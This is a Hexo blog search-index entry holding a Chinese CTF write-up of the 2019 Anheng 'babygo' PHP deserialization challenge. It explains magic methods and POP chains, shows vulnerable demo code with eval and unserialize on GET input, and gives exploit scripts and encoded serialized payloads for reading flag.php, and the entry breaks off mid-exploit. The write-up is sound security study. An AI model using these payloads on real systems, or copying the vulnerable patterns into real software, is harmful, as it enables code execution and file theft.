<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019安恒一月赛反序列化题复现分析</title>
    <url>/yakko117/2019/10/16/2019%E5%AE%89%E6%81%921%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h1><p>考察知识点：</p>
<ul>
<li>PHP反序列化</li>
<li>PHP魔术方法</li>
<li>POP链构造<br>由于本人只会一点反序列化，POP链构造也没学习过<br>因此尝试把这道题复现一下，记录下这次学习分析的过程<br><a href="https://www.anquanke.com/post/id/170341">飘零师傅的wp</a></li>
</ul>
<h2 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$skyobj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bbb</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;skyobj-&gt;<span class="title function_ invoke__">read</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$amzing</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nice = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nice-&gt;aaa = <span class="variable">$sth</span>;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">              aaa会被重新赋值，所以使用指针，这样bbb会跟随aaa动态改变</span></span><br><span class="line"><span class="comment">              $a = new baby();</span></span><br><span class="line"><span class="comment">              $a-&gt;bbb =&amp;$a-&gt;aaa</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;nice-&gt;aaa === <span class="variable language_">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">            <span class="comment">/*需要满足$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb，即可读取文件*/</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;        </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;you must be joking!&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;it&#x27;s so sec~~&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$Input_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$Input_data</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;./anheng.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="首先先了解一些知识点"><a href="#首先先了解一些知识点" class="headerlink" title="首先先了解一些知识点"></a>首先先了解一些知识点</h1><p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">柠檬师傅的ref</a><br><a href="https://www.ft12.com/article_462.html">其他的ref</a></p>
<h2 id="php对象常见的魔术方法"><a href="#php对象常见的魔术方法" class="headerlink" title="php对象常见的魔术方法"></a>php对象常见的魔术方法</h2><ul>
<li><strong>public void __construct：</strong>构造函数，在创建新对象时会先调用此方法(如果存在的话)</li>
<li><strong>public __destruct：</strong> 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，在调用<code>exit()</code>方法时也会先调用 <code>destruct()</code></li>
<li><strong>public string __toString：</strong>用于一个类被当成字符串时应怎样回应(5.2以前只针对ehco ,print，5.2后针对所有字符串情况)</li>
<li><strong>public array __sleep：</strong> <code>serialize()</code> 函数会检查是否存在魔术方法 <code>sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 <code>NULL</code> 被序列化，并产生一个 <code>E_NOTICE</code> 级别的错误（不会打断脚本执行）。</li>
<li><strong>public void __wakeup：</strong> <code>unserialize()</code> 函数会检查是否存在魔法方法 <code>wakeup()</code>。如果存在，则会先调用 <code>wakeup</code> 方法，预先准备对象需要的资源。<code>wakeup()</code> 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
<li><strong>__call：</strong>在对象中调用一个不可访问方法时被调用</li>
</ul>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Magic_methods</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$var1</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;run __construct&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;run __destruct&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;run __toString&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;run __sleep&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;var1&#x27;</span>,<span class="string">&#x27;var2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;run __wakeup&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个新对象，会先调用__construct()</span></span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Magic_methods</span>();</span><br><span class="line">    <span class="comment">// 将对象当作字符串输出，会先调用__toString()</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 调用serialize()之前先调用__sleep()</span></span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 调用unserialize()之前会先调用__wakeup()</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span> <span class="comment">// 此处又一次调用了__toString()</span></span><br><span class="line">    <span class="comment">// 脚本执行完毕，即将销毁所有创建的对象，此时调用__destruct()</span></span><br><span class="line">    <span class="comment">// 反序列化恢复的对象被销毁，再次调用__desruct()</span></span><br><span class="line">    <span class="comment">// 所以这里调用了2次__destruct()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>得到结果如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">run __construct</span><br><span class="line">run __toString</span><br><span class="line">abc</span><br><span class="line">run __sleep</span><br><span class="line">O:<span class="number">13</span>:<span class="string">&quot;Magic_methods&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;var1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;var2&quot;</span>;i:<span class="number">1</span>;&#125;</span><br><span class="line">run __wakeup</span><br><span class="line">run __toString</span><br><span class="line">abc</span><br><span class="line">run __destruct</span><br><span class="line">run __destruct</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h2><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
<p>基本概念</p>
<p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>
<hr>
<h2 id="简单的漏洞Demo-1"><a href="#简单的漏洞Demo-1" class="headerlink" title="简单的漏洞Demo_1"></a>简单的漏洞Demo_1</h2><h3 id="demo-1-php"><a href="#demo-1-php" class="headerlink" title="demo_1.php"></a>demo_1.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// unserialize 参数可控，导致用户可以注入恶意内容</span></span><br><span class="line"><span class="comment">// POP 链起于一些&quot;小组件&quot;，这些小组件可以调用其他的&quot;组件&quot;，在PHP 中，这些组件就是魔术方法(__wakeup or __destruct)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;demo\n&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span> = <span class="string">&#x27;./demo&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="DemoPoc-php"><a href="#DemoPoc-php" class="headerlink" title="DemoPoc.php"></a>DemoPoc.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成文件DemoPoc.txt，对象传递保存在其中</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;./demo_1.php&quot;</span>;</span><br><span class="line"><span class="variable">$demo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">popdemo</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./DemoPoc.txt&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="DemoUnserialize-php"><a href="#DemoUnserialize-php" class="headerlink" title="DemoUnserialize.php"></a>DemoUnserialize.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 将对象反序列化，联合对象本来的功能，新建一个新文件demo</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;./Demo_1.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./DemoPoc.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后运行<code>DemoPoc.php</code> 和<code>DemoUnserialize.php</code> 即可完成一个写入文件的操作，打开生成的<code>DemoPoc.txt</code> 和<code>demo</code> 看看</p>
<hr>
<h3 id="DemoPoc-txt"><a href="#DemoPoc-txt" class="headerlink" title="DemoPoc.txt"></a>DemoPoc.txt</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g03m9j30q2038dft.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g03m9j30q2038dft.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;popdemo&quot;:2:&#123;s:13:&quot; popdemo data&quot;;s:5:&quot;demo</span><br><span class="line">&quot;;s:17:&quot; popdemo filename&quot;;s:6:&quot;./demo&quot;;&#125;</span><br><span class="line">可以看到将 Demo_1.php 中 popdemo() 序列化打印</span><br></pre></td></tr></table></figure></div>

<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g05ppj307n03dt8k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g05ppj307n03dt8k.jpg" class="lazyload"></a><br>运行<code>DemoUnserialize.php</code> 会生成一个 <code>demo</code>文件， 内容为 <strong>demo</strong> ，当我们能够控制序列化的字符串的时候，这个地方就会存在任意文件写操作的漏洞</p>
<blockquote>
<p>在DemoPoc 中， popdemo data 占了13个字节长度，是因为序列化时：对象私有化成员会自动添加了类名，以区分他们是Private 变量；如果是Protected 变量则会添加* 号。并且前缀添加空字节</p>
</blockquote>
<hr>
<h2 id="漏洞Demo-2"><a href="#漏洞Demo-2" class="headerlink" title="漏洞Demo_2"></a>漏洞Demo_2</h2><p>序列化漏洞利用方法，不一定直接出现在魔术方法中，如果关键代码不在魔术方法中时，而是在一个类的普通的方法中，这时候就需要<strong>寻找相同的函数名将类的属性和敏感函数的属性联系起来。</strong></p>
<h3 id="manayakko-php"><a href="#manayakko-php" class="headerlink" title="manayakko.php"></a>manayakko.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">manayakko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><code>manyakko</code>这个类正常情况下，会在构造方法中实例化一个 <code>normal</code>类的对象，在析构方法中会调用此对象的 <code>action方法</code>，最终打印hello字符串，不存在敏感的操作</p>
<hr>
<h3 id="exp-php"><a href="#exp-php" class="headerlink" title="exp.php"></a>exp.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">manayakko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">manayakko</span>()));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\r&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>运行exp.php生成payload，内容为：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A9%3A%22manayakko%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D </span><br><span class="line">解码得到</span><br><span class="line">O:9:&quot;manayakko&quot;:1:&#123;s:11:&quot;*ClassObj&quot;;O:4:&quot;evil&quot;:1:&#123;s:10:&quot;evildata&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>尝试攻击，将payload通过<code>get</code>请求传入到<code>manayakko.php</code>的GET请求参数d里去<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2g5zj30vz0btwes.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2g5zj30vz0btwes.jpg" class="lazyload"></a></p>
<p><code>manayakko.php</code> 会将传入的d，进行解码和反序列化，传入恶意序列化参数语句，进行命令执行，成功调用了类evil中的action方法，打出webshell。</p>
<blockquote>
<p>敏感的操作不一定要在魔术方法当中，当找到魔术方法以后，如果存在敏感操作，可以分析参数是否可控；当存在有敏感操作的普通方法时，就可以分析是否存在具有调用了同名方法的魔术方法，劫持代码的运行流程，触发漏洞代码</p>
</blockquote>
<hr>
<h2 id="反序列化漏洞挖掘"><a href="#反序列化漏洞挖掘" class="headerlink" title="反序列化漏洞挖掘"></a>反序列化漏洞挖掘</h2><p>反序列化漏洞的挖掘主要是在代码中找到可以利用的POP组件，具体思路：<br>利用文本搜索工具，在目标代码中搜索，**__wakeup，__destruct**这类魔术方法</p>
<p>跟踪方法，看魔术方法中是否存在一些可以利用的地方，找到可以利用的POP组件</p>
<p>根据类的结构定义构建序列化字符串Poc</p>
<hr>
<h2 id="回归主题"><a href="#回归主题" class="headerlink" title="回归主题"></a>回归主题</h2><p>前面扯的有点多，源码自己编辑器打开看吧</p>
<p>首先，我们发现只要满足</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</span><br></pre></td></tr></table></figure></div>
<p>即可读文件<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g86ykj30vj0mxdiz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g86ykj30vj0mxdiz.jpg" class="lazyload"></a></p>
<p>利用pop链，构造</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;skyobj-&gt;<span class="title function_ invoke__">read</span>();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure></div>
<p>同时注意到<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g515zj30sk097402.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g515zj30sk097402.jpg" class="lazyload"></a></p>
<p>构造出如下序列化</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;&#125;</span><br><span class="line">转码得到</span><br><span class="line">O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure></div>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;    </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;          </span><br><span class="line">        $this-&gt;skyobj = new cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&#x27;./flag.php&#x27;;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public 